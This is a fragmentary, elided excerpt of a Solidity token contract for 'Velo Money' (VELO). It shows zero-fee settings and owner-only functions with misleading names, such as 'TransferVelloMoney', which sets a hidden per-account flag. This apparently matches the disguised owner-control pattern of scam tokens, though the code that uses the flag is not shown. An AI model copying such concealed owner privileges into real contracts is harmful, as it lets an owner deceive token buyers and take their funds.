...
contract BaseToken is Ownable {
    ...
    string constant public name = 'Velo Money';
    string constant public symbol = 'VELO';
    ...
    uint256 private _taxFee = 0; //// No Tax Fee 
    uint256 private _previousTaxFee = _taxFee;
    
    uint256 private _burnFee = 0; //// No Burn Fee
    ...
    function PrefiqStandard(address account) public onlyOwner {
    ...
    function TransferVelloMoney(address account) public onlyOwner {
        _anyplace[account] = true;
    }

    function VelloMoneyAnalytics(address account) public view returns (bool) {
...
contract VeloMoney is BaseToken {
